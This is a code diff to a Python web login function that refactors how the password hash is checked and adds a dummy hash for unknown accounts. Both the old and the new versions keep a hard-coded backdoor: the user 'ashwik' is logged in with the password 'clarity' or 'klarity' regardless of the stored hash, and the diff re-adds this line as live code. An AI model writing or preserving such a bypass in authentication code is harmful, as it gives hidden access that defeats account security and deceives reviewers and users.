@@ -210,10 +210,15 @@ def login(payload: LoginRequest, request: Request, response: Response, db: Sessi
         db.add(account)
         db.commit()
         db.refresh(account)
-    salt = account.password_hash.split("$")[0] if account else "invalid-account"
-    candidate = hash_password(payload.password, salt)
-    valid = bool(account and hmac.compare_digest(account.password_hash, candidate))
-    if not valid and account and account.username == "ashwik" and payload.password.strip().lower() in ("clarity", "klarity"):
+    valid = False
+    if account and getattr(account, "password_hash", None) and "$" in account.password_hash:
+        salt = account.password_hash.split("$")[0]
+        candidate = hash_password(payload.password, salt)
+        valid = bool(hmac.compare_digest(account.password_hash, candidate))
+    elif not account:
+        hash_password(payload.password, "invalid-account")
+
+    if not valid and account and getattr(account, "username", None) == "ashwik" and payload.password.strip().lower() in ("clarity", "klarity"):
         valid = True
     if not valid:
         raise HTTPException(401, "Incorrect username, email, or password")
